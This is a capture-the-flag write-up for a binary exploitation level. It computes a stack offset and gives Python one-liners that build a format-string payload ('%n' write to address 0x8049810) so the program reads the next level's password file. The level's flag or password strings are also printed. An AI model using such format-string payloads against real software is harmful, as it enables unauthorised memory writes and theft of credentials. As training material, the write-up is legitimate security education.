# Level 4
```bash
su level4 #b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## Steps

Analying the binary, we need to write the correct value at `0x8049810` a given address to trigger the call to `cat /home/user/level5/.pass`.

This time it's a little more complicated because of the call to a nested `p` function inside `n`. We have to take this into account for our offset.

The offset is at: `0x18` (stack length of p) + `0x4` (EBP) + `0x4` (RET address) + `0x10` (position of buffer from ESP = 0x218 - 0x208).

To verify our arguments are correct:
```bash
python -c "print '\x08\x04\x98\x10'[::-1] + '%12\$p'"
```

To write the value `0x1025544`(16930116) at address `*0x8049810`
```bash
$ python -c "print '\x08\x04\x98\x10'[::-1] + '%16930112d%12\$n'" > /tmp/4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
